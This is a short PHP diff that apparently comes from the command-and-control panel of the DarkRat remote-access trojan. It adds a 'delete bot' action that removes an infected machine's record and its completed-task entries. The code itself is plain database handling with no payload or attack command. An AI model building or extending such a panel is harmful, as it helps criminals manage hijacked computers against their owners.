@@ -447,11 +447,24 @@ class Main{
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
+
+
             $GLOBALS["template"][0] ="Main";
             $GLOBALS["template"][1] ="botinfo";
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
             $result = $statement->execute(array($id));
             $row = $statement->fetch(PDO::FETCH_ASSOC);
+
+            if(!empty($_POST["delete_bot"])){
+                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM bots WHERE id = ?");
+                $statement->execute(array($_POST["botid"]));
+
+                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks_completed WHERE bothwid LIKE ?");
+                $statement->execute(array($row["hwid"]));
+                Header("Location: /bots");
+            }
+
+
             $row["ram"] = $this->formatBytes($row["ram"]);
             $GLOBALS["tpl"]->assign("botinfo",$row);
         }
